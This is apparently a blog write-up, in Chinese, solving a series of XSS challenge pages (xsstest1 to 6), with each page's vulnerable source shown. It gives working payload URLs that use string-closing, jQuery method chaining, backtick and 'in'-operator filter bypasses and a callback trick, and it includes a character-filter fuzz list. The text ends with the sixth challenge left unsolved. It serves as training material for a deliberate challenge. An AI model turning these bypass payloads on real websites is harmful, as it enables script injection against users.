[一些BAT的XSS实例（一）基础篇](https://xz.aliyun.com/t/11677)

[http://px1624.sinaapp.com/test/xsstest1/](http://px1624.sinaapp.com/test/xsstest1/)

# xsstest1

```html
<script type="text/javascript">
var x=location.hash;
function aa(x){};
setTimeout("aa('"+x+"')",100);
</script>
Give me xss bypass 1~
```

`location.hash`会获取url中`#`后的内容

[https://developer.mozilla.org/zh-CN/docs/Web/API/Location/hash](https://developer.mozilla.org/zh-CN/docs/Web/API/Location/hash)

![](https://img.mi3aka.eu.org/2022/09/0a5e4ff1026f909a8b1a64f79989244e.png)

`http://px1624.sinaapp.com/test/xsstest1/#asdf'),alert(1),aa('`

![](https://img.mi3aka.eu.org/2022/09/5ed0b905ae6d237f2eae41b65560101b.png)

通过闭合`setTimeout`得到`setTimeout("aa('asdf'),alert(1),aa('')",100);`

# xsstest2

```html
<html>
<head>
<script src="./jquery-3.4.1.min.js"></script>
Give me xss bypass 2~
<div style='display:none' id='xx'>&lt;img src=x onerror=alert(1)&gt;</div><!--id为xx-->
<input type='button' value='test' onclick='alert("哈哈，点这玩意没啥用的！")'>
<body>
<script>
   var query = window.location.search.substring(1);
   var vars = query.split("&");
   if(vars){
		aa(vars[0],vars[1])
   }
   	function aa(x,y){
		$("#xx")[x]($("#xx")[y]());//对id为xx的标签进行了两次dom操作
	}
</script>
</body>
</html>
```

![](https://img.mi3aka.eu.org/2022/09/63c68a477b4c6cc3f20c47685d536e5d.png)

通过`$("#xx")['text']()`获取`#xx`中的内容,通过`$("#xx")['html']('asdf')`修改`#xx`中的内容

![](https://img.mi3aka.eu.org/2022/09/0060b8390960c27340a1f4015842fe93.png)

`http://px1624.sinaapp.com/test/xsstest2/?html&text`

`$("#xx")[html]($("#xx")[text]())`

![](https://img.mi3aka.eu.org/2022/09/4ba0478ca12475f555184d87078a1773.png)

# xsstest3

```html
Give me xss bypass 3~
<script src="./jquery-3.4.1.min.js"></script>
<script>
    $(function test() {
		var px = '';
		if (px != "") {
			$('xss').val('');
		}
	})
</script>
```

以px作为参数传参,发现px会被赋值

![](https://img.mi3aka.eu.org/2022/09/15b1cbcf7b2cfc359aa56b7c329a76ff.png)

`http://px1624.sinaapp.com/test/xsstest3/?px=%27%2balert(1)%2b%27`即`'+aler(1)+'`即可,最终构成的js如下

```js
    $(function test() {
		var px = ''+alert(1)+'';
		if (px != "") {
			$('xss').val(''+alert(1)+'');
		}
	})
```

![](https://img.mi3aka.eu.org/2022/09/7fa684c66377c882a3e44793910e1f1d.png)

# xsstest4

```html
Give me xss bypass 4~
<script src="./jquery-3.4.1.min.js"></script>
<script>
    $(function test() {
		var px = '';
		if (px != "") {
			$('xss').val('');
		}
	})
</script>
```

同样以px作为参数传参,发现px会被赋值,但是直接用第三题的payload去打会返回`error input!`

通过`'+'`和`'-'`进行测试得知,`'`没有被过滤,但`+`和`-`被过滤了,fuzz后得到过滤结果如下

```
http://px1624.sinaapp.com/test/xsstest4/?px=' '
http://px1624.sinaapp.com/test/xsstest4/?px='!' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='"'
http://px1624.sinaapp.com/test/xsstest4/?px='#'
http://px1624.sinaapp.com/test/xsstest4/?px='$'
http://px1624.sinaapp.com/test/xsstest4/?px='%' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='&'
http://px1624.sinaapp.com/test/xsstest4/?px='''
http://px1624.sinaapp.com/test/xsstest4/?px='('
http://px1624.sinaapp.com/test/xsstest4/?px=')'
http://px1624.sinaapp.com/test/xsstest4/?px='*' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='+'
http://px1624.sinaapp.com/test/xsstest4/?px=','
http://px1624.sinaapp.com/test/xsstest4/?px='-' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='.'
http://px1624.sinaapp.com/test/xsstest4/?px='/' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='0'
http://px1624.sinaapp.com/test/xsstest4/?px='1'
http://px1624.sinaapp.com/test/xsstest4/?px='2'
http://px1624.sinaapp.com/test/xsstest4/?px='3'
http://px1624.sinaapp.com/test/xsstest4/?px='4'
http://px1624.sinaapp.com/test/xsstest4/?px='5'
http://px1624.sinaapp.com/test/xsstest4/?px='6'
http://px1624.sinaapp.com/test/xsstest4/?px='7'
http://px1624.sinaapp.com/test/xsstest4/?px='8'
http://px1624.sinaapp.com/test/xsstest4/?px='9'
http://px1624.sinaapp.com/test/xsstest4/?px=':'
http://px1624.sinaapp.com/test/xsstest4/?px=';'
http://px1624.sinaapp.com/test/xsstest4/?px='<' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='=' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='>' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='?' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='@'
http://px1624.sinaapp.com/test/xsstest4/?px='A'
http://px1624.sinaapp.com/test/xsstest4/?px='B'
http://px1624.sinaapp.com/test/xsstest4/?px='C'
http://px1624.sinaapp.com/test/xsstest4/?px='D'
http://px1624.sinaapp.com/test/xsstest4/?px='E'
http://px1624.sinaapp.com/test/xsstest4/?px='F'
http://px1624.sinaapp.com/test/xsstest4/?px='G'
http://px1624.sinaapp.com/test/xsstest4/?px='H'
http://px1624.sinaapp.com/test/xsstest4/?px='I'
http://px1624.sinaapp.com/test/xsstest4/?px='J'
http://px1624.sinaapp.com/test/xsstest4/?px='K'
http://px1624.sinaapp.com/test/xsstest4/?px='L'
http://px1624.sinaapp.com/test/xsstest4/?px='M'
http://px1624.sinaapp.com/test/xsstest4/?px='N'
http://px1624.sinaapp.com/test/xsstest4/?px='O'
http://px1624.sinaapp.com/test/xsstest4/?px='P'
http://px1624.sinaapp.com/test/xsstest4/?px='Q'
http://px1624.sinaapp.com/test/xsstest4/?px='R'
http://px1624.sinaapp.com/test/xsstest4/?px='S'
http://px1624.sinaapp.com/test/xsstest4/?px='T'
http://px1624.sinaapp.com/test/xsstest4/?px='U'
http://px1624.sinaapp.com/test/xsstest4/?px='V'
http://px1624.sinaapp.com/test/xsstest4/?px='W'
http://px1624.sinaapp.com/test/xsstest4/?px='X'
http://px1624.sinaapp.com/test/xsstest4/?px='Y'
http://px1624.sinaapp.com/test/xsstest4/?px='Z'
http://px1624.sinaapp.com/test/xsstest4/?px='['
http://px1624.sinaapp.com/test/xsstest4/?px='\'
http://px1624.sinaapp.com/test/xsstest4/?px=']'
http://px1624.sinaapp.com/test/xsstest4/?px='^' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='_'
http://px1624.sinaapp.com/test/xsstest4/?px='`'
http://px1624.sinaapp.com/test/xsstest4/?px='a'
http://px1624.sinaapp.com/test/xsstest4/?px='b'
http://px1624.sinaapp.com/test/xsstest4/?px='c'
http://px1624.sinaapp.com/test/xsstest4/?px='d'
http://px1624.sinaapp.com/test/xsstest4/?px='e'
http://px1624.sinaapp.com/test/xsstest4/?px='f'
http://px1624.sinaapp.com/test/xsstest4/?px='g'
http://px1624.sinaapp.com/test/xsstest4/?px='h'
http://px1624.sinaapp.com/test/xsstest4/?px='i'
http://px1624.sinaapp.com/test/xsstest4/?px='j'
http://px1624.sinaapp.com/test/xsstest4/?px='k'
http://px1624.sinaapp.com/test/xsstest4/?px='l'
http://px1624.sinaapp.com/test/xsstest4/?px='m'
http://px1624.sinaapp.com/test/xsstest4/?px='n'
http://px1624.sinaapp.com/test/xsstest4/?px='o'
http://px1624.sinaapp.com/test/xsstest4/?px='p'
http://px1624.sinaapp.com/test/xsstest4/?px='q'
http://px1624.sinaapp.com/test/xsstest4/?px='r'
http://px1624.sinaapp.com/test/xsstest4/?px='s'
http://px1624.sinaapp.com/test/xsstest4/?px='t'
http://px1624.sinaapp.com/test/xsstest4/?px='u'
http://px1624.sinaapp.com/test/xsstest4/?px='v'
http://px1624.sinaapp.com/test/xsstest4/?px='w'
http://px1624.sinaapp.com/test/xsstest4/?px='x'
http://px1624.sinaapp.com/test/xsstest4/?px='y'
http://px1624.sinaapp.com/test/xsstest4/?px='z'
http://px1624.sinaapp.com/test/xsstest4/?px='{'
http://px1624.sinaapp.com/test/xsstest4/?px='|' error input!
http://px1624.sinaapp.com/test/xsstest4/?px='}'
http://px1624.sinaapp.com/test/xsstest4/?px='~' error input!
```

发现反引号没有被过滤,而js会将反引号中的内容理解为字符串

```html
http://px1624.sinaapp.com/test/xsstest4/?px=';{alert(1);`.toString('

Give me xss bypass 4~
<script src="./jquery-3.4.1.min.js"></script>
<script>
    $(function test() {
		var px = '';{alert(1);`.toString('';
		if (px != "") {
			$('xss').val('';{alert(1);`.toString('');
		}
	})
</script>
```

![](https://img.mi3aka.eu.org/2022/09/bbd9d025c58f7468aaacefb00c43723c.png)

或者可以使用运算符`in`

`http://px1624.sinaapp.com/test/xsstest4/?px=' in alert(1) in'`

![](https://img.mi3aka.eu.org/2022/09/3a7b39dccba499509f787d7ed0a9de67.png)

# xsstest5

```html
<html>
<script src="../jquery-3.4.1.min.js"></script>
<Script src="./index.js"></Script>
<head>
<script type="text/javascript">
var orguin = $.Tjs_Get('uin');
var pagenum= $.Tjs_Get('pn');
if(orguin<=0) window.location="./user.php?callback=Give me xss bypass~";
document.write('<script type="text/javascript" 	src="http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"><\/script>');
</script>
</head>
<body>
Give me xss bypass 5~
</body>
</html>
```

```js
Tjs_Get:function(parmtname){
	var sl = location.href.indexOf('&');
	var hl = location.href.indexOf('#');
	var str = '';
	if ((sl < 0 || sl > hl) && hl > 0) str = location.hash.substr(1);
	else str = location.search.substr(1);
			
	str=str.replace(/%/g,"");
	//var SERVER_TEMP = str;
	var SERVER_TEMP			= $.Tjs_HtmlEncode(str.replace(/.*\?/,"")); //HtmlEncode ���а�ȫ��֤

	var PAGE_PARMT_ARRAY	= SERVER_TEMP.split("&amp;");
	if(PAGE_PARMT_ARRAY.length==0) return "";
	var value="";
	for(var i=0;i<PAGE_PARMT_ARRAY.length;i++){
		if(PAGE_PARMT_ARRAY[i]=="") continue;
		var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf("="));
		if(GETname == parmtname){
			value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf("=")+1),PAGE_PARMT_ARRAY[i].length);
			return value;
			break;
		}
	}
	return "";
},
```

`http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&pn=callback=alert(1)`

![](https://img.mi3aka.eu.org/2022/09/8c8f2e84149325c0e337f8ba48c4c750.png)

# xsstest6

```html
<html>
<script src="../jquery-3.4.1.min.js"></script>
<Script src="./index.js"></Script>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">
var orguin = $.Tjs_Get('uin');
if(orguin<=0) window.location="./user.php?callback=";
document.write('<script type="text/javascript" 	src="http://px1624.sinaapp.com/pxpath/'+decodeURIComponent(orguin)+'&'+Math.random()+'"><\/script>');
</script>
</head>
<body>
Give me xss bypass 6~【任意浏览器弹1就算通过】
</body>
</html>
```